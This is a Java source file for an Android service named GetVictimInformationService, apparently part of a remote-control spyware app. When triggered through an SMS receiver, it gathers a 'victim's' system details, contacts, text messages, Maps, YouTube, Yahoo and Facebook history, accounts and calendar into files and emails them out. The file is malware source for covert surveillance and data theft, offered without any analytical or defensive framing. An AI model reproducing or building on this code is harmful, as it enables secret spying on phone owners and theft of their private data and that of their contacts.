package tuisolutions.tuisecurity.services;

import java.io.File;

import tuisolutions.tuisecurity.models.Parameters;
import tuisolutions.tuisecurity.receivers.SmsReceiver;
import tuisolutions.tuisecurity.utils.AppUtils;
import tuisolutions.tuisecurity.utils.FileUtils;
import tuisolutions.tuisecurity.utils.PreferencesUtils;
import tuisolutions.tuisecurity.utils.Utils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;


public class GetVictimInformationService extends Service {
    private static final String TAG = GetVictimInformationService.class.getSimpleName();
    private String m_path;
    private int m_type;
    private File m_file;
    
    @Override
    public void onCreate() {
        super.onCreate();
        m_path = PreferencesUtils.getPathSaveFile(getApplicationContext());
        FileUtils.mkdir(new File(m_path));
    }
    
    @SuppressWarnings("deprecation")
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.v(TAG, "Get Victim infomation");
        m_type = intent.getIntExtra(SmsReceiver.TYPE_INFO, 0);
        switch (m_type) {
            case Parameters.GET_SYSTEM:
                m_path += "victimSystem.txt";
                AppUtils.getInformation(Parameters.GET_SYSTEM, m_path);
                break;
            case Parameters.GET_CONTACT:
                m_path += "victimContact.db";
                AppUtils.getInformation(Parameters.GET_CONTACT, m_path);
                break;
            case Parameters.GET_MESSAGE:
                m_path += "victimSMS.db";
                AppUtils.getInformation(Parameters.GET_MESSAGE, m_path);
                break;
            case Parameters.GET_MAP_HISTORY:
                m_path += "victimHistorySearchMap.db";
                AppUtils.getInformation(Parameters.GET_MAP_HISTORY, m_path);
                break;
            case Parameters.GET_YOUTUBE_HISTORY:
                m_path += "victimHistoryYoutube.db";
                AppUtils.getInformation(Parameters.GET_YOUTUBE_HISTORY, m_path);
                break;
            case Parameters.GET_YAHOO_HISTORY:
                m_path += "victimHistoryYahoo.db";
                AppUtils.getInformation(Parameters.GET_YAHOO_HISTORY, m_path);
                break;
            case Parameters.GET_FACEBOOK_DB:
                m_path += "victimHistoryFacebook.db";
                AppUtils.getInformation(Parameters.GET_FACEBOOK_DB, m_path);
                break;
            case Parameters.GET_ACCOUNT:
                m_path += "victimAccount.db";
                AppUtils.getInformation(Parameters.GET_ACCOUNT, m_path);
                break;
            case Parameters.GET_CALENDAR:
                m_path += "victimCalendar.db";
                AppUtils.getInformation(Parameters.GET_CALENDAR, m_path);
                break;
            default:
                break;
        }
        m_file = new File(m_path);
        if (m_file.exists()) {
            // Send email
            Utils.sendEmail(getBaseContext(), m_path, true);
        }
        stopSelf();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
